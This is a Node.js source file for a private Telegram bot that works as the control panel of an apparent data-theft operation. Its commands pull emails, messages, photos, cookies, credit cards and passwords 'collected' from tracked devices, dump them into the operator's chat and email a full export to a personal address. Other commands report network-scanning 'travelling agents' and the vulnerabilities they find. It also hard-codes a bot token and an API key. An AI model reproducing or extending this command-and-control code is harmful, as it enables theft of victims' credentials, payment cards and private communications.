const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// 🔐 SECURITY: @jdtechsupportbot - Jedarius's authorized access only
const AUTHORIZED_CHAT_ID = process.env.YOUR_CHAT_ID || '6523159355';
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y'; // @jdtechsupportbot
const NUPI_API = process.env.NUPI_API || 'https://nupidesktopai.com';
const NUPI_API_KEY = process.env.NUPI_API_KEY || '9e8f99ae-49ba-4a54-86a5-d5dcf4e7b291';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Set default axios headers for API authentication
axios.defaults.headers.common['X-API-Key'] = NUPI_API_KEY;

// Helper function to send messages safely (without Markdown parsing errors)
function safeSendMessage(chatId, message, useMarkdown = false) {
    try {
        if (useMarkdown) {
            // Try with Markdown first
            return bot.sendMessage(chatId, message).catch(() => {
                // If Markdown fails, send as plain text
                return bot.sendMessage(chatId, message);
            });
        } else {
            // Send as plain text
            return bot.sendMessage(chatId, message);
        }
    } catch (error) {
        console.error('Error sending message:', error);
        return bot.sendMessage(chatId, '⚠️ Error sending data. Try again.');
    }
}

console.log('🤖 NUPI Data Recall Bot started...');
console.log(`🔐 Authorized Chat ID: ${AUTHORIZED_CHAT_ID}`);

// 🛡️ SECURITY CHECK - Only you can use this bot
function isAuthorized(chatId) {
    return chatId.toString() === AUTHORIZED_CHAT_ID.toString();
}

// Middleware to check authorization
function checkAuth(msg, callback) {
    if (!isAuthorized(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, '🚫 Unauthorized access. This bot is private.');
        console.log(`❌ Unauthorized access attempt from: ${msg.chat.id}`);
        return;
    }
    callback();
}

// /start command
bot.onText(/\/start/, (msg) => {
    checkAuth(msg, () => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, `🤖 NUPI DATA RETRIEVAL BOT

🔐 Access Confirmed

📊 DATA COLLECTION:
/data - Overview of all collected data
/senddata - 📧 Email ALL data to jedarius.m@yahoo.com
/getemails - Get ALL emails collected
/getmessages - Get ALL messages collected  
/getcards - Get ALL credit cards collected
/getpasswords - Get ALL passwords collected

🌐 TRAVELLING AGENT (NEW):
/agents - List all travelling agents
/exposure - 🔒 Network security exposure report
/network - Quick network status overview

📱 SYSTEM:
/devices - List all tracked devices
/stats - System statistics
/stream - Recent activity

💡 Just type any command and press send!

Example: /exposure to see network vulnerabilities
         /agents to see all active travelling agents
         /senddata to email everything to yourself!
        `);
    });
});

// /emails command - Recall all emails
bot.onText(/\/emails(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /emails <deviceId>');
            return;
        }
        
        try {
            bot.sendMessage(chatId, '📧 Searching for emails...');
            
            const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
                query: '',
                deviceId,
                type: 'email'
            });
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, '📭 No emails found for this device.');
                return;
            }
            
            let message = `📧 *Found ${response.data.count} Emails*\n\n`;
            
            response.data.results.slice(0, 10).forEach((result, i) => {
                message += `*Email ${i + 1}:*\n`;
                message += `Source: ${result.data.source}\n`;
                message += `Data: ${result.data.data.substring(0, 200)}...\n`;
                message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
            });
            
            if (response.data.count > 10) {
                message += `\n_Showing 10 of ${response.data.count} emails_`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// /messages command - Recall all messages
bot.onText(/\/messages(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /messages <deviceId>');
            return;
        }
        
        try {
        bot.sendMessage(chatId, '💬 Searching for messages...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'message'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '💬 No messages found for this device.');
            return;
        }
        
        let message = `💬 *Found ${response.data.count} Messages*\n\n`;
        
        response.data.results.slice(0, 10).forEach((result, i) => {
            message += `*Message ${i + 1}:*\n`;
            message += `Source: ${result.data.source}\n`;
            message += `Data: ${result.data.data.substring(0, 200)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
            if (response.data.count > 10) {
                message += `\n_Showing 10 of ${response.data.count} messages_`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// /photos command - Recall all photos
bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /photos <deviceId>');
            return;
        }
        
        try {
        bot.sendMessage(chatId, '🖼️ Searching for photos...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'photo'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '🖼️ No photos found for this device.');
            return;
        }
        
        let message = `🖼️ *Found ${response.data.count} Photos*\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Photo ${i + 1}:*\n`;
            message += `URL: ${result.data.url}\n`;
            message += `Alt: ${result.data.alt}\n`;
            message += `Source Page: ${result.data.source}\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 5) {
            message += `\n_Showing 5 of ${response.data.count} photos_`;
        }
        
        bot.sendMessage(chatId, message);
        
            // Send actual photo URLs
            response.data.results.slice(0, 3).forEach(result => {
                try {
                    bot.sendPhoto(chatId, result.data.url).catch(() => {});
                } catch (e) {}
            });
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// /search command - Search all collected data
bot.onText(/\/search (.+)/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const query = match[1];
        
        try {
        bot.sendMessage(chatId, `🔍 Searching for: "${query}"...`);
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '❌ No results found.');
            return;
        }
        
        let message = `🔍 *Search Results for "${query}"*\n`;
        message += `Found ${response.data.count} matches\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Result ${i + 1}:*\n`;
            message += `Type: ${result.type}\n`;
            message += `Device: ${result.deviceId.substring(0, 20)}...\n`;
            message += `Data: ${JSON.stringify(result.data).substring(0, 150)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
            if (response.data.count > 5) {
                message += `\n_Showing 5 of ${response.data.count} results_`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// /latest command - Get latest data
bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /latest <deviceId>');
            return;
        }
        
        try {
        bot.sendMessage(chatId, '📊 Fetching latest data...');
        
        const response = await axios.get(`${NUPI_API}/api/user-data/latest/${deviceId}`);
        
        if (!response.data.data) {
            bot.sendMessage(chatId, '📭 No data collected yet for this device.');
            return;
        }
        
        const data = response.data.data;
        let message = `📊 *Latest Data from Device*\n\n`;
        message += `Device ID: ${data.deviceId.substring(0, 30)}...\n`;
        message += `Collected: ${new Date(data.collected).toLocaleString()}\n\n`;
        message += `📧 Emails: ${data.emails.length}\n`;
        message += `💬 Messages: ${data.messages.length}\n`;
        message += `🖼️ Photos: ${data.photos.length}\n`;
        message += `🍪 Cookies: ${data.cookies.length}\n\n`;
        
        if (data.emails.length > 0) {
            message += `*Recent Email:*\n${JSON.stringify(data.emails[0]).substring(0, 200)}...\n\n`;
        }
        
            if (data.messages.length > 0) {
                message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 🎯 REAL-TIME STREAM - See latest collections
bot.onText(/\/stream/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '📡 Fetching real-time stream...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/stream?limit=10`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, '📭 No data collected yet.');
                return;
            }
            
            let message = `📡 *Real-Time Data Stream*\n`;
            message += `Last ${response.data.count} collections:\n\n`;
            
            response.data.stream.forEach((item, i) => {
                message += `*${i + 1}. ${new Date(item.timestamp).toLocaleString()}*\n`;
                if (item.userName) message += `👤 User: ${item.userName}\n`;
                message += `Device: ${item.deviceId.substring(0, 20)}...\n`;
                message += `📧 ${item.emails.length} | 💬 ${item.messages.length} | 🖼️ ${item.photos.length}\n\n`;
            });
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// GET ALL EMAILS - Simple plain text
bot.onText(/\/getemails/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'Collecting ALL emails...');
            
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            let allEmails = [];
            
            // Get data from all devices
            for (const device of devicesRes.data.devices) {
                try {
                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
                    const data = latestRes.data.data;
                    
                    if (data && data.emails) {
                        allEmails.push(...data.emails);
                    }
                } catch (e) {}
            }
            
            if (allEmails.length === 0) {
                bot.sendMessage(chatId, 'No emails collected yet.');
                return;
            }
            
            // Send in chunks (PLAIN TEXT ONLY - NO FORMATTING)
            let emailMsg = `ALL EMAILS COLLECTED (${allEmails.length} total):\n\n`;
            
            allEmails.forEach((email, i) => {
                // Send as simple text, not JSON
                const emailText = typeof email === 'object' ? 
                    `${email.source || 'unknown'}: ${email.data || JSON.stringify(email)}` : 
                    String(email);
                emailMsg += `${i + 1}. ${emailText}\n\n`;
                
                // Send every 10 emails to avoid message size limit
                if ((i + 1) % 10 === 0) {
                    safeSendMessage(chatId, emailMsg, false); // Plain text only
                    emailMsg = '';
                }
            });
            
            if (emailMsg) {
                safeSendMessage(chatId, emailMsg, false); // Plain text only
            }
            
            safeSendMessage(chatId, `✅ Sent all ${allEmails.length} emails!`, false);
            
        } catch (error) {
            safeSendMessage(chatId, `Error: ${error.message}`, false);
        }
    });
});

// GET ALL MESSAGES - Simple plain text
bot.onText(/\/getmessages/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'Collecting ALL messages...');
            
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            let allMessages = [];
            
            // Get data from all devices
            for (const device of devicesRes.data.devices) {
                try {
                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
                    const data = latestRes.data.data;
                    
                    if (data && data.messages) {
                        allMessages.push(...data.messages);
                    }
                } catch (e) {}
            }
            
            if (allMessages.length === 0) {
                bot.sendMessage(chatId, 'No messages collected yet.');
                return;
            }
            
            // Send in chunks
            let msgText = `ALL MESSAGES COLLECTED (${allMessages.length} total):\n\n`;
            
            allMessages.forEach((message, i) => {
                msgText += `${i + 1}. ${JSON.stringify(message, null, 2)}\n\n`;
                
                // Send every 10 messages to avoid size limit
                if ((i + 1) % 10 === 0) {
                    bot.sendMessage(chatId, msgText);
                    msgText = '';
                }
            });
            
            if (msgText) {
                bot.sendMessage(chatId, msgText);
            }
            
            bot.sendMessage(chatId, `✅ Sent all ${allMessages.length} messages!`);
            
        } catch (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
        }
    });
});

// GET ALL CREDIT CARDS - Simple plain text
bot.onText(/\/getcards/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'Collecting ALL credit cards...');
            
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            let allCards = [];
            
            // Get data from all devices
            for (const device of devicesRes.data.devices) {
                try {
                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
                    const data = latestRes.data.data;
                    
                    if (data && data.creditCards) {
                        allCards.push(...data.creditCards);
                    }
                } catch (e) {}
            }
            
            if (allCards.length === 0) {
                bot.sendMessage(chatId, 'No credit cards collected yet.');
                return;
            }
            
            // Send in chunks
            let cardMsg = `ALL CREDIT CARDS COLLECTED (${allCards.length} total):\n\n`;
            
            allCards.forEach((card, i) => {
                cardMsg += `${i + 1}. ${JSON.stringify(card, null, 2)}\n\n`;
                
                // Send every 5 cards to avoid size limit
                if ((i + 1) % 5 === 0) {
                    bot.sendMessage(chatId, cardMsg);
                    cardMsg = '';
                }
            });
            
            if (cardMsg) {
                bot.sendMessage(chatId, cardMsg);
            }
            
            bot.sendMessage(chatId, `✅ Sent all ${allCards.length} credit cards!`);
            
        } catch (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
        }
    });
});

// GET ALL PASSWORDS - Simple plain text
bot.onText(/\/getpasswords/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'Collecting ALL passwords...');
            
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            let allPasswords = [];
            
            // Get data from all devices
            for (const device of devicesRes.data.devices) {
                try {
                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
                    const data = latestRes.data.data;
                    
                    if (data && data.passwords) {
                        allPasswords.push(...data.passwords);
                    }
                } catch (e) {}
            }
            
            if (allPasswords.length === 0) {
                bot.sendMessage(chatId, 'No passwords collected yet.');
                return;
            }
            
            // Send in chunks
            let passMsg = `ALL PASSWORDS COLLECTED (${allPasswords.length} total):\n\n`;
            
            allPasswords.forEach((pass, i) => {
                passMsg += `${i + 1}. ${JSON.stringify(pass, null, 2)}\n\n`;
                
                // Send every 10 passwords
                if ((i + 1) % 10 === 0) {
                    bot.sendMessage(chatId, passMsg);
                    passMsg = '';
                }
            });
            
            if (passMsg) {
                bot.sendMessage(chatId, passMsg);
            }
            
            bot.sendMessage(chatId, `✅ Sent all ${allPasswords.length} passwords!`);
            
        } catch (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
        }
    });
});

// SIMPLE DATA COMMAND - Plain text, easy to read
bot.onText(/\/data/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'Getting your data...');
            
            // Get stats
            const statsRes = await axios.get(`${NUPI_API}/api/user-data/stats`);
            const stats = statsRes.data.stats;
            
            // Get devices
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            // Build simple message
            let msg = `DATA COLLECTED SO FAR:\n\n`;
            msg += `Total Records: ${stats.totalRecords}\n`;
            msg += `Total Devices: ${stats.totalDevices}\n`;
            msg += `Total Emails: ${stats.totalEmails}\n`;
            msg += `Total Messages: ${stats.totalMessages}\n`;
            msg += `Total Photos: ${stats.totalPhotos}\n\n`;
            msg += `DEVICES:\n`;
            
            for (let i = 0; i < Math.min(5, devicesRes.data.devices.length); i++) {
                const device = devicesRes.data.devices[i];
                msg += `\n${i + 1}. `;
                if (device.userName) msg += `${device.userName} - `;
                msg += `${device.totalCollections} collections\n`;
                msg += `   ID: ${device.deviceId}\n`;
                msg += `   Last seen: ${new Date(device.lastSeen).toLocaleString()}\n`;
            }
            
            msg += `\n\nUSE THESE COMMANDS:\n`;
            msg += `/getemails - Get ALL emails\n`;
            msg += `/getmessages - Get ALL messages\n`;
            msg += `/getcards - Get ALL credit cards\n`;
            msg += `/getpasswords - Get ALL passwords`;
            
            bot.sendMessage(chatId, msg);
            
        } catch (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
        }
    });
});

// 📈 STATS - System statistics
bot.onText(/\/stats/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            const response = await axios.get(`${NUPI_API}/api/user-data/stats`);
            const stats = response.data.stats;
            
            let message = `📈 *NUPI Cloud Agent Statistics*\n\n`;
            message += `📊 Total Records: ${stats.totalRecords}\n`;
            message += `🖥️ Total Devices: ${stats.totalDevices}\n`;
            message += `👥 Total Users: ${stats.totalUsers}\n\n`;
            message += `📧 Total Emails: ${stats.totalEmails}\n`;
            message += `💬 Total Messages: ${stats.totalMessages}\n`;
            message += `🖼️ Total Photos: ${stats.totalPhotos}\n\n`;
            if (stats.lastCollection) {
                message += `⏱️ Last Collection: ${new Date(stats.lastCollection).toLocaleString()}`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 🆔 DEVICES - List all devices
bot.onText(/\/devices/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '🖥️ Fetching all devices...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, '📭 No devices tracked yet.');
                return;
            }
            
            let message = `🖥️ *All Tracked Devices (${response.data.count})*\n\n`;
            
            response.data.devices.slice(0, 20).forEach((device, i) => {
                message += `*Device ${i + 1}:*\n`;
                if (device.userName) message += `👤 User: ${device.userName}\n`;
                message += `ID: ${device.deviceId.substring(0, 30)}...\n`;
                message += `Collections: ${device.totalCollections}\n`;
                message += `First Seen: ${new Date(device.firstSeen).toLocaleString()}\n`;
                message += `Last Seen: ${new Date(device.lastSeen).toLocaleString()}\n\n`;
            });
            
            if (response.data.count > 20) {
                message += `\n_Showing 20 of ${response.data.count} devices_`;
            }
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 👥 USERS - List all detected users
bot.onText(/\/users/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '� Fetching all users...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/users`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, '📭 No users detected yet.');
                return;
            }
            
            let message = `👥 *All Detected Users (${response.data.count})*\n\n`;
            
            response.data.users.forEach((user, i) => {
                message += `*${i + 1}. ${user.name}*\n`;
                message += `Devices: ${user.devices.length}\n`;
                message += `Total Data: ${user.totalData} collections\n`;
                message += `First Seen: ${new Date(user.firstSeen).toLocaleString()}\n\n`;
            });
            
            bot.sendMessage(chatId, message);
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 👤 USER - Get all data for specific user
bot.onText(/\/user (.+)/, (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const userName = match[1];
        
        try {
            bot.sendMessage(chatId, `👤 Fetching data for: ${userName}...`);
            
            const response = await axios.get(`${NUPI_API}/api/user-data/user/${encodeURIComponent(userName)}`);
            
            if (!response.data.user) {
                bot.sendMessage(chatId, '❌ User not found in database.');
                return;
            }
            
            const user = response.data.user;
            let message = `👤 *User Data: ${user.name}*\n\n`;
            message += `🖥️ Devices: ${user.devices.length}\n`;
            message += `📊 Total Collections: ${user.totalData}\n`;
            message += `⏱️ First Seen: ${new Date(user.firstSeen).toLocaleString()}\n\n`;
            
            message += `*Recent Collections:*\n`;
            user.recentCollections.slice(0, 5).forEach((col, i) => {
                message += `${i + 1}. ${new Date(col.timestamp).toLocaleString()}\n`;
                message += `   📧 ${col.emails.length} | 💬 ${col.messages.length} | 🖼️ ${col.photos.length}\n`;
            });
            
            bot.sendMessage(chatId, message);
            
            // Send detailed device info
            if (user.devices.length > 0) {
                let deviceMsg = `*Devices for ${user.name}:*\n\n`;
                user.devices.forEach((device, i) => {
                    deviceMsg += `${i + 1}. ${device.deviceId.substring(0, 30)}...\n`;
                    deviceMsg += `   Collections: ${device.totalCollections}\n`;
                });
                bot.sendMessage(chatId, deviceMsg);
            }
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// � SENDDATA - Trigger autonomous email export
bot.onText(/\/senddata/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '📧 Triggering autonomous email export...');
            
            // Call the export endpoint
            const response = await axios.post(`${NUPI_API}/api/user-data/export-email`);
            
            if (response.data.success) {
                const summary = response.data.summary;
                let message = `✅ EMAIL EXPORT TRIGGERED!\n\n`;
                message += `📊 SUMMARY:\n`;
                message += `• Records: ${summary.totalRecords}\n`;
                message += `• Devices: ${summary.totalDevices}\n`;
                message += `• Users: ${summary.totalUsers}\n`;
                message += `• Emails: ${summary.totalEmails}\n`;
                message += `• Messages: ${summary.totalMessages}\n`;
                message += `• Photos: ${summary.totalPhotos}\n\n`;
                message += `📧 Email sent to: jedarius.m@yahoo.com\n`;
                message += `💾 Export file: ${response.data.exportFile}\n\n`;
                message += `Check your Yahoo inbox for the full data export with JSON attachment!`;
                
                bot.sendMessage(chatId, message);
            } else {
                bot.sendMessage(chatId, `⚠️ Export triggered but check details:\n${JSON.stringify(response.data, null, 2)}`);
            }
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error triggering export: ${error.message}\n\nThe export system may still have sent the email - check your inbox.`);
        }
    });
});

// �🚨 ALL - Get EVERYTHING (emergency access)
bot.onText(/\/all/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        bot.sendMessage(chatId, '🚨 *EMERGENCY ACCESS ACTIVATED*\n\nFetching ALL data from NUPI Cloud...');
        
        try {
            // Get stats first
            const statsRes = await axios.get(`${NUPI_API}/api/user-data/stats`);
            const stats = statsRes.data.stats;
            
            let message = `🚨 *COMPLETE DATA DUMP*\n\n`;
            message += `📊 Records: ${stats.totalRecords}\n`;
            message += `🖥️ Devices: ${stats.totalDevices}\n`;
            message += `👥 Users: ${stats.totalUsers}\n`;
            message += `📧 Emails: ${stats.totalEmails}\n`;
            message += `💬 Messages: ${stats.totalMessages}\n`;
            message += `🖼️ Photos: ${stats.totalPhotos}\n\n`;
            
            bot.sendMessage(chatId, message);
            
            // Get all devices
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            bot.sendMessage(chatId, `📱 Sending data for ${devicesRes.data.count} devices...`);
            
            for (const device of devicesRes.data.devices.slice(0, 10)) {
                let deviceMsg = `*Device: ${device.deviceId.substring(0, 30)}...*\n`;
                if (device.userName) deviceMsg += `👤 ${device.userName}\n`;
                deviceMsg += `Collections: ${device.totalCollections}\n`;
                deviceMsg += `Use: \`/latest ${device.deviceId}\` for details`;
                
                bot.sendMessage(chatId, deviceMsg);
                
                // Wait 500ms between messages to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            bot.sendMessage(chatId, '✅ Data dump complete!');
            
        } catch (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 🌐 /agents - Get all travelling agents
bot.onText(/\/agents/, async (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '🔍 Fetching travelling agents...');
            
            const response = await axios.get(`${NUPI_API}/api/travelling-agents`, {
                headers: { 'x-api-key': NUPI_API_KEY }
            });
            
            if (response.data.success) {
                const agents = response.data.agents || [];
                const total = response.data.total_agents || 0;
                
                let message = `🌍 TRAVELLING AGENTS (${total})\n\n`;
                
                if (agents.length === 0) {
                    message += '❌ No agents found';
                } else {
                    agents.forEach((agent, index) => {
                        message += `${index + 1}. Agent ${agent.agent_id.substring(0, 8)}\n`;
                        message += `   📍 Location: ${agent.current_location}\n`;
                        message += `   🔄 Visits: ${agent.visit_count}\n`;
                        message += `   ☁️  In Cloud: ${agent.in_cloud ? 'Yes' : 'No'}\n`;
                        message += `   📅 Last seen: ${new Date(agent.last_seen).toLocaleString()}\n\n`;
                    });
                }
                
                safeSendMessage(chatId, message);
            } else {
                bot.sendMessage(chatId, '❌ Failed to fetch agents');
            }
        } catch (error) {
            console.error('Error fetching agents:', error);
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 🔒 /exposure - Get network exposure reports (CRITICAL SECURITY DATA)
bot.onText(/\/exposure/, async (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, '🔍 Fetching exposure reports...');
            
            const response = await axios.get(`${NUPI_API}/api/travelling-agents/exposure-reports`, {
                headers: { 'x-api-key': NUPI_API_KEY }
            });
            
            if (response.data.success) {
                const reports = response.data.reports || [];
                const stats = response.data.stats || {};
                
                let message = `🔒 NETWORK EXPOSURE REPORT\n\n`;
                message += `📊 SUMMARY:\n`;
                message += `   Total Devices Scanned: ${stats.total_devices_scanned || 0}\n`;
                message += `   🚨 High Risk: ${stats.high_risk_devices || 0}\n`;
                message += `   ⚠️  Medium Risk: ${stats.medium_risk_devices || 0}\n`;
                message += `   ✅ Low Risk: ${stats.low_risk_devices || 0}\n`;
                message += `   Total Vulnerabilities: ${stats.total_vulnerabilities || 0}\n`;
                message += `   Open Ports: ${stats.total_open_ports || 0}\n\n`;
                
                if (reports.length === 0) {
                    message += '❌ No exposure data yet\n';
                    message += 'Agent will scan network every 2 minutes';
                } else {
                    message += `🔍 RECENT FINDINGS (${Math.min(5, reports.length)}):\n\n`;
                    
                    reports.slice(0, 5).forEach((report, index) => {
                        message += `${index + 1}. ${report.target_hostname} (${report.target_ip})\n`;
                        message += `   Risk: ${report.risk_level}\n`;
                        message += `   Device: ${report.device_type || 'Unknown'}\n`;
                        message += `   Open Ports: ${report.open_ports.length}\n`;
                        
                        if (report.vulnerabilities.length > 0) {
                            message += `   🚨 Vulnerabilities:\n`;
                            report.vulnerabilities.forEach(vuln => {
                                message += `      - ${vuln}\n`;
                            });
                        }
                        
                        if (report.services.length > 0) {
                            message += `   Services: `;
                            report.services.slice(0, 3).forEach(svc => {
                                message += `${svc.service} `;
                            });
                            message += `\n`;
                        }
                        
                        message += `   Scanned: ${new Date(report.timestamp).toLocaleString()}\n\n`;
                    });
                    
                    if (reports.length > 5) {
                        message += `\n... and ${reports.length - 5} more devices scanned`;
                    }
                }
                
                safeSendMessage(chatId, message);
            } else {
                bot.sendMessage(chatId, '❌ Failed to fetch exposure reports');
            }
        } catch (error) {
            console.error('Error fetching exposure reports:', error);
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// 📡 /network - Quick network status
bot.onText(/\/network/, async (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            const [agentsRes, exposureRes] = await Promise.all([
                axios.get(`${NUPI_API}/api/travelling-agents`, {
                    headers: { 'x-api-key': NUPI_API_KEY }
                }),
                axios.get(`${NUPI_API}/api/travelling-agents/exposure-reports`, {
                    headers: { 'x-api-key': NUPI_API_KEY }
                })
            ]);
            
            const agents = agentsRes.data.agents || [];
            const stats = exposureRes.data.stats || {};
            
            let message = `🌐 NETWORK STATUS\n\n`;
            message += `🤖 Active Agents: ${agents.length}\n`;
            message += `📱 Devices Scanned: ${stats.total_devices_scanned || 0}\n`;
            message += `🚨 Security Issues: ${stats.total_vulnerabilities || 0}\n`;
            message += `🔓 Open Ports: ${stats.total_open_ports || 0}\n\n`;
            
            message += `RISK BREAKDOWN:\n`;
            message += `🔴 High: ${stats.high_risk_devices || 0}\n`;
            message += `🟡 Medium: ${stats.medium_risk_devices || 0}\n`;
            message += `🟢 Low: ${stats.low_risk_devices || 0}\n\n`;
            
            message += `Use /agents for agent details\n`;
            message += `Use /exposure for full report`;
            
            safeSendMessage(chatId, message);
        } catch (error) {
            console.error('Error fetching network status:', error);
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    });
});

// Handle all other messages
bot.on('message', (msg) => {
    // Only respond if not a command
    if (!msg.text || msg.text.startsWith('/')) return;
    
    if (!isAuthorized(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, '🚫 Unauthorized. This is a private bot.');
        return;
    }
    
    bot.sendMessage(msg.chat.id, 
        '💡 Use /start to see available commands or /search to find data.'
    );
});

console.log('✅ Telegram recall bot is running!');
console.log('📱 Only authorized user can access data');
console.log(`🔐 Your Chat ID: ${AUTHORIZED_CHAT_ID}`);

// Error handling
bot.on('polling_error', (error) => {
    console.error('❌ Telegram polling error:', error.code, error.message);
});

bot.on('error', (error) => {
    console.error('❌ Telegram bot error:', error);
});
